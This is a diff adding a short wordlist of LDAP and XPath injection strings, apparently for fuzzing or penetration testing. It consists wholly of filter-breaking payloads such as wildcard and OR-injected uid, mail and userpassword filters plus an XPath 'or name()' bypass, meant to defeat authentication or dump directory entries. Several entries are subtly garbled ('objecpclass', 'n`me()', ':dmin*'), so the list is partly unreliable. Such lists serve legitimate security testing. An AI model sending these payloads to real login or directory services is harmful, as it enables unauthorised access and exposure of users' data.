@@ -1,0 +1,25 @@
+!
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%%7C
+%7C
+&
+(
+)
+*(|(mail=*))
+*(|(objecpclass=*))
+*/*
+*|
+/
+//
+//*
+@*
+x' or n`me()='username' or 'x'='y
+|
+*()|&'
+admin*
+:dmin*)((|userpassword=*)
+*)(uid=*))(|(uid=*
